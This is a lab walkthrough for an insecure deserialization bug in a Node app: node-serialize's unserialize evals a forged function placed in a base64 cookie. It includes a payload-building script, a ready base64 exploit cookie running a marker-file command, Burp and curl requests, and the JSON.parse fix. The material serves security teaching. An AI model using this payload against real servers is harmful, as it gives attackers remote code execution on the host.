# Walkthrough — deserialization-node

The app stores your preferences in a cookie called `prefs`. Under the hood it **serializes** the preferences object with **`node-serialize`** — an npm library that turns a JavaScript object into a string and rebuilds it later — and base64-encodes the result into the cookie. On every request it reads `prefs`, base64-decodes it, and calls `serialize.unserialize` on the string to rebuild the object. The problem: **you control your own cookie.** And `node-serialize` does not rebuild only data — it can rebuild **functions**, and it does so by running **`eval`** on the function's source. A forged cookie carrying a self-invoking function makes `unserialize` run the code you choose: a command on the server.

## 1. Context

The single endpoint is `GET /`. On the first visit the app sets a `prefs` cookie and returns your preferences as JSON — `{"theme":"light"}`; every later request reads that cookie back to render your theme. That is the whole feature; there is no form and no HTML (you don't edit preferences in a UI — the interesting input is the cookie itself).

This is **insecure deserialization**, under **A08 — Software and Data Integrity Failures**. *Serialization* is turning an in-memory object into a string you can store or send; *deserialization* is the reverse — rebuilding the object from that string. The category is about trusting data whose integrity you never verified: here the app takes a cookie the user controls and rebuilds an object from it with a library that can carry *code*, not just *data*. A few terms used below, defined once:

- **`node-serialize`** — an npm package that (de)serializes JavaScript objects. Unlike JSON, it can serialize **functions**.
- **`_$$ND_FUNC$$_`** — the marker `node-serialize` writes in front of a serialized function; it stores the function as a string, its source prefixed with this tag.
- **`eval`** — the JavaScript function that runs a string as code. On `unserialize`, `node-serialize` rebuilds a tagged function by `eval`-ing its source.
- **IIFE** (immediately-invoked function expression) — a function that calls itself: writing `function(){ ... }()` (note the trailing `()`) runs it the instant it is evaluated.
- **RCE** (Remote Code Execution) — running arbitrary commands on the server.

There is no database and no second service — just the `vulnerable` API on `127.0.0.1:8027` and the `fixed` API on `127.0.0.1:8127`. Exploration is done in Burp (`curl` is the equivalent), plus a short Node script to build the payload. This atom is API-only; there is no browser track. The proof of code execution is a side effect on the server (a marker file), read with `docker compose exec` — not something you see in the HTTP response.

## 2. Spot the bug

Open [`vulnerable/app.js`](./vulnerable/app.js). The `/` handler rebuilds your preferences like this:

```javascript
const cookie = getCookie(req, "prefs");
...
// VULNERABLE: the "prefs" cookie is base64-decoded and passed straight to serialize.unserialize.
prefs = serialize.unserialize(Buffer.from(cookie, "base64").toString());
```

The string fed to `serialize.unserialize` comes straight from your cookie. `node-serialize` is not a data format like JSON — it can rebuild **functions**. It serializes a function as a string tagged `_$$ND_FUNC$$_`, carrying the function's source; on `unserialize`, when it sees that tag, it rebuilds the function by running `eval` on the source (roughly `eval("(" + source + ")")`). If the source is a function body that ends in `()` — a self-invoking function — the `eval` doesn't just *rebuild* it, it *runs* it, right there inside `unserialize`. Point that function at `require("child_process").execSync(...)` and deserializing the cookie runs a shell command. Audit question: *this string comes from my cookie, which I control — and `unserialize` will `eval` whatever function it names?* — yes.

**Why the clean cookie doesn't give the format away.** You might expect to spot the danger just by decoding the cookie on the wire — but you can't, and that is worth understanding. For **pure data**, `node-serialize` produces exactly the same string as JSON: `serialize.serialize({theme:"light"})` is `{"theme":"light"}`, byte-for-byte what `JSON.stringify` would give. So the baseline `prefs` cookie decodes to plain, JSON-looking text with no marker in sight — and it is *identical* to what the fixed app sets. The format's danger is **dormant in data**; it only **wakes up when a function is serialized**, and that only happens if you put one there. The tell is not on the wire — it is in the source (the app calls `serialize.unserialize`, not `JSON.parse`) and in the payload you are about to build (the `_$$ND_FUNC$$_` string). The fix (foreshadowed): stop using a format that can carry behavior.

The cheap first-pass grep for this class is any deserializer fed untrusted input:

```bash
grep -rn 'node-serialize\|\.unserialize(' .
```

## 3. Exploitation via Burp Suite

Point Burp at the vulnerable API on `127.0.0.1:8027` and work from Repeater. Every request below is a block you paste into Repeater; the same requests run under `curl`.

### Step 1 — Baseline: see the cookie the app sets

Send `GET /` with no `prefs` cookie (the first visit has none):

```
GET / HTTP/1.1
Host: 127.0.0.1:8027
```

The response sets one for you and shows the feature working:

```
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: prefs=eyJ0aGVtZSI6ImxpZ2h0In0=; Path=/

{"theme":"light"}
```

Decode that cookie value and you get plain, JSON-looking text — no marker, nothing that screams "node-serialize":

```
$ echo 'eyJ0aGVtZSI6ImxpZ2h0In0=' | base64 -d
{"theme":"light"}
```

As noted in step 2, that is expected: `node-serialize` and JSON are identical for pure data. The danger is invisible until *you* serialize a function. From here you replace the cookie with a payload of your own.

### Step 2 — Build the payload

`node-serialize` will `eval` a serialized function on `unserialize`, so build one whose body self-invokes. This short Node script prints the base64 cookie to send — it is how you'd craft the payload in a real engagement:

```javascript
const serialize = require("node-serialize");

// node-serialize serializes this function as a "_$$ND_FUNC$$_"-tagged string.
let s = serialize.serialize({
  rce: function () {
    require("child_process").execSync("touch /tmp/pwned");
  },
});

// Append () to the serialized function body so it self-invokes (an IIFE) on unserialize.
s = s.replace('}"', '}()"');

console.log(Buffer.from(s).toString("base64"));
```

```
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9
```

Decode it to see exactly what you are sending — perfectly valid `node-serialize`, with the tell-tale marker and the trailing `()`:

```
$ echo 'eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9' | base64 -d
{"rce":"_$$ND_FUNC$$_function () { require(\"child_process\").execSync(\"touch /tmp/pwned\"); }()"}
```

The `rce` value is a string that begins with `_$$ND_FUNC$$_` and ends with `}()`. Building the payload is safe: `serialize.serialize` only *records* the function's source into the string; nothing runs yet. The command runs on whoever calls `serialize.unserialize` on these bytes — because on `unserialize` the marker makes `node-serialize` `eval` the source, and the trailing `()` makes that source invoke itself. There is nothing malformed here to "sanitize" — it is well-formed `node-serialize` doing exactly what the library is designed to do.

### Step 3 — Fire it and prove execution

Before you send, confirm the marker does not exist yet:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

In Repeater, set the cookie to your payload and send:

```
GET / HTTP/1.1
Host: 127.0.0.1:8027
Cookie: prefs=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9
```

The response looks completely ordinary:

```
HTTP/1.1 200 OK
Content-Type: application/json

{"theme":"light"}
```

`{"theme":"light"}`, same as always — **nothing in the response reveals the attack.** That is the nature of deserialization RCE: the command fires *inside* `serialize.unserialize`, before the app does anything with the result, and the handler falls back to the default theme and answers as if nothing happened. The proof is the side effect. Check the server:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
-rw-r--r-- 1 root root 0 Aug  4 18:12 /tmp/pwned
```

The file exists — your cookie made the server run `touch /tmp/pwned`, as `root`. The same request under `curl`:

```bash
curl -s http://127.0.0.1:8027/ -H 'Cookie: prefs=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9'
```

**What this really is.** Here the command runs inside a throwaway, isolated container, so `touch`-ing an empty file is harmless — that isolation is the safety net for this lab. On a real target this is full **Remote Code Execution**: arbitrary commands as the server user, on the server's machine. The innocuous `touch` stands in for complete control of the host. Keep your payloads demonstrative — a marker file is enough; there is never a reason to reach for `rm -rf`, a reverse shell, or anything destructive or networked, even in a container.

## 4. What the vuln is NOT

The exploit is a cookie you tampered with, so it is easy to draw the wrong lesson. Isolate the real cause:

- **It is NOT "a tamperable cookie" — signing does not fix it.** The tempting reaction is "sign the cookie with an HMAC so it can't be forged." That raises the bar for *this* delivery (a forged cookie is rejected), but it does not touch the cause: `serialize.unserialize` on untrusted data is still RCE. If the signing key ever leaks, or the data reaches `unserialize` by any other path — a cache, a queue, a file, a second endpoint — you are back to code execution. The cause is the **format**, not the cookie's authenticity. (Symptom vs. cause — see [`DIFF.md`](./DIFF.md).)
- **It is NOT a validation / input-sanitizing bug.** The malicious cookie is *valid* `node-serialize` (Step 2's decode proves it — a well-formed object with a string value). There is no malformed input to reject and nothing to "sanitize" out. The library itself `eval`s behavior carried in well-formed data.
- **It is NOT `deserialization-pickle` again, just in JavaScript.** It is the **same class** (insecure deserialization, A08) with the **same ceiling** (RCE), but a different concrete cause. In `deserialization-pickle` the deserializer is Python's stdlib `pickle`, triggered by an object's `__reduce__`; here the deserializer is an npm package, `node-serialize`, triggered by an `eval`'d `_$$ND_FUNC$$_` function. The same class materializes through a mechanism native to each ecosystem — this atom is the Node face of it. (See the contrast table below.)

**Proof of isolation:** send a *benign* cookie — the default `{"theme":"light"}`, base64 `eyJ0aGVtZSI6ImxpZ2h0In0=` — to **both** apps, and both return `{"theme":"light"}` and touch nothing. The feature is identical (and, because `node-serialize` equals JSON for pure data, the benign cookie is literally the same string on both sides). Only the `_$$ND_FUNC$$_` payload separates them: the vulnerable app `eval`s it, the fixed app cannot.

The one thing it **is**: `serialize.unserialize` rebuilds a function *you* forged and `eval`s it, because the format carries behavior. The only fix is to use a format that carries **data only**.

| Axis | `deserialization-pickle` | `deserialization-node` (this atom) |
|---|---|---|
| **Runtime / format** | Python, `pickle` (stdlib) | Node.js, `node-serialize` (npm package) |
| **Where the executor lives** | `pickle.loads` (standard library) | `serialize.unserialize` (npm dependency) |
| **Code trigger in the data** | object with `__reduce__` → calls the function on unpickle | function with `_$$ND_FUNC$$_` → `eval`'d on unserialize |
| **Fix** | change format: `pickle` → JSON | change format: `unserialize` → `JSON.parse` |
| **Impact** | RCE | RCE |

## 5. Impact

**Remote Code Execution.** The attacker runs arbitrary commands on the server through a single tampered cookie — the top of the severity scale. It is the same ceiling as `deserialization-pickle`, reached by a different mechanism (an npm library that `eval`s a serialized function, rather than the stdlib calling a function named by `__reduce__`). No overclaim: it is RCE as the app's container user (here, `root`), which already means full control of that host.

## 6. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. The fixed app on port **8127** reads the same cookie but (de)serializes with **JSON** — a data-only format — and drops `node-serialize` entirely:

```javascript
prefs = JSON.parse(Buffer.from(cookie, "base64").toString());
```

Replay the exploit against it: send the *same* malicious cookie:

```
GET / HTTP/1.1
Host: 127.0.0.1:8127
Cookie: prefs=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkgeyByZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjU3luYyhcInRvdWNoIC90bXAvcHduZWRcIik7IH0oKSJ9
```

The response is the ordinary `{"theme":"light"}`, and the server is untouched:

```
$ docker compose exec fixed ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

The marker is never created. `JSON.parse` on the payload just produces a plain object where `rce` is an inert **string** — JSON has no construct that names a function, so there is no `eval`, no code path to reach. The benign case is unchanged — the default `{"theme":"light"}` round-trips through JSON exactly as it did through `node-serialize`.

Note what the fix is *not*: it does not validate the cookie, block the `_$$ND_FUNC$$_` string, or sign it. Signing (an HMAC) is a mitigation worth having in depth — it makes tampering detectable — but it guards an unsafe operation instead of removing it; the root fix is to stop deserializing untrusted data with a format that carries behavior. And because the dangerous deserializer here is a *dependency*, the fix removes it: the fixed app has zero runtime dependencies. `node-serialize` → `JSON.parse` is the whole change.
